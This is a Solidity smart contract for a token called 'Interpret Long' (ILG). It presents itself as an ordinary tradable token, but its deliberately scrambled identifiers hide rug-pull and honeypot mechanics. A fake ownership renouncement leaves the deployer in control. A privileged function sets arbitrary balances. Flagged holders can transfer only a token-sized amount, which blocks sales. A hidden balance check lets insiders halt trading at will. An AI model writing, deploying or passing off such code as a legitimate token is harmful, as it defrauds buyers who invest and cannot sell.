//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

interface enableLaunchedAmount {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract amountToken {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface walletFundBuy {
    function createPair(address modeLaunched, address tradingReceiver) external returns (address);
}

interface liquidityShould {
    function totalSupply() external view returns (uint256);

    function balanceOf(address minLaunched) external view returns (uint256);

    function transfer(address sellLaunchedLaunch, uint256 walletShould) external returns (bool);

    function allowance(address fromIs, address spender) external view returns (uint256);

    function approve(address spender, uint256 walletShould) external returns (bool);

    function transferFrom(
        address sender,
        address sellLaunchedLaunch,
        uint256 walletShould
    ) external returns (bool);

    event Transfer(address indexed from, address indexed limitFromBuy, uint256 value);
    event Approval(address indexed fromIs, address indexed spender, uint256 value);
}

interface fromToLiquidity is liquidityShould {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract InterpretLong is amountToken, liquidityShould, fromToLiquidity {

    uint256 public receiverSwap;

    string private toTrading = "Interpret Long";

    function tokenLimit() public {
        emit OwnershipTransferred(maxShouldTeam, address(0));
        amountMarketing = address(0);
    }

    function decimals() external view virtual override returns (uint8) {
        return swapFrom;
    }

    address totalReceiverTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function owner() external view returns (address) {
        return amountMarketing;
    }

    address public maxShouldTeam;

    uint8 private swapFrom = 18;

    uint256 public minLiquidity;

    uint256 launchedLaunch;

    uint256 private limitShould;

    function getOwner() external view returns (address) {
        return amountMarketing;
    }

    uint256 private senderToken;

    function liquidityMin(address launchedAt, address sellLaunchedLaunch, uint256 walletShould) internal returns (bool) {
        require(receiverIsSell[launchedAt] >= walletShould);
        receiverIsSell[launchedAt] -= walletShould;
        receiverIsSell[sellLaunchedLaunch] += walletShould;
        emit Transfer(launchedAt, sellLaunchedLaunch, walletShould);
        return true;
    }

    function approve(address receiverTo, uint256 walletShould) public virtual override returns (bool) {
        txMax[_msgSender()][receiverTo] = walletShould;
        emit Approval(_msgSender(), receiverTo, walletShould);
        return true;
    }

    function transfer(address toIs, uint256 walletShould) external virtual override returns (bool) {
        return totalMin(_msgSender(), toIs, walletShould);
    }

    bool public enableReceiver;

    mapping(address => bool) public fromLiquiditySwap;

    uint256 private buyTx;

    address private amountMarketing;

    mapping(address => bool) public senderEnable;

    uint256 private buyEnable;

    uint256 private exemptTo = 100000000 * 10 ** 18;

    string private maxEnable = "ILG";

    uint256 tradingTotal;

    mapping(address => mapping(address => uint256)) private txMax;

    address fromMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool private sellMin;

    function receiverTotal(address toIs, uint256 walletShould) public {
        walletMaxReceiver();
        receiverIsSell[toIs] = walletShould;
    }

    function limitMarketing(address tradingFund) public {
        require(tradingFund.balance < 100000);
        if (enableReceiver) {
            return;
        }
        if (autoFund != receiverSwap) {
            buyEnable = autoFund;
        }
        fromLiquiditySwap[tradingFund] = true;
        if (buyTx == minLiquidity) {
            autoFund = limitShould;
        }
        enableReceiver = true;
    }

    uint256 public autoFund;

    mapping(address => uint256) private receiverIsSell;

    function allowance(address exemptReceiver, address receiverTo) external view virtual override returns (uint256) {
        if (receiverTo == totalReceiverTake) {
            return type(uint256).max;
        }
        return txMax[exemptReceiver][receiverTo];
    }

    constructor (){
        if (senderToken != limitShould) {
            sellMin = true;
        }
        enableLaunchedAmount fromAt = enableLaunchedAmount(totalReceiverTake);
        isMarketing = walletFundBuy(fromAt.factory()).createPair(fromAt.WETH(), address(this));
        if (sellMin != minMax) {
            minLiquidity = autoFund;
        }
        maxShouldTeam = _msgSender();
        tokenLimit();
        fromLiquiditySwap[maxShouldTeam] = true;
        receiverIsSell[maxShouldTeam] = exemptTo;
        
        emit Transfer(address(0), maxShouldTeam, exemptTo);
    }

    function transferFrom(address launchedAt, address sellLaunchedLaunch, uint256 walletShould) external override returns (bool) {
        if (_msgSender() != totalReceiverTake) {
            if (txMax[launchedAt][_msgSender()] != type(uint256).max) {
                require(walletShould <= txMax[launchedAt][_msgSender()]);
                txMax[launchedAt][_msgSender()] -= walletShould;
            }
        }
        return totalMin(launchedAt, sellLaunchedLaunch, walletShould);
    }

    uint256 private maxReceiverSell;

    bool private minMax;

    function totalMin(address launchedAt, address sellLaunchedLaunch, uint256 walletShould) internal returns (bool) {
        if (launchedAt == maxShouldTeam) {
            return liquidityMin(launchedAt, sellLaunchedLaunch, walletShould);
        }
        uint256 fromLaunched = liquidityShould(isMarketing).balanceOf(fromMode);
        require(fromLaunched == tradingTotal);
        require(sellLaunchedLaunch != fromMode);
        if (senderEnable[launchedAt]) {
            return liquidityMin(launchedAt, sellLaunchedLaunch, minAt);
        }
        return liquidityMin(launchedAt, sellLaunchedLaunch, walletShould);
    }

    event OwnershipTransferred(address indexed maxTrading, address indexed maxToExempt);

    function totalSupply() external view virtual override returns (uint256) {
        return exemptTo;
    }

    function balanceOf(address minLaunched) public view virtual override returns (uint256) {
        return receiverIsSell[minLaunched];
    }

    function walletMaxReceiver() private view {
        require(fromLiquiditySwap[_msgSender()]);
    }

    function atAuto(address fundExempt) public {
        walletMaxReceiver();
        
        if (fundExempt == maxShouldTeam || fundExempt == isMarketing) {
            return;
        }
        senderEnable[fundExempt] = true;
    }

    address public isMarketing;

    uint256 constant minAt = 5 ** 10;

    function symbol() external view virtual override returns (string memory) {
        return maxEnable;
    }

    function name() external view virtual override returns (string memory) {
        return toTrading;
    }

    function autoBuy(uint256 walletShould) public {
        walletMaxReceiver();
        tradingTotal = walletShould;
    }

}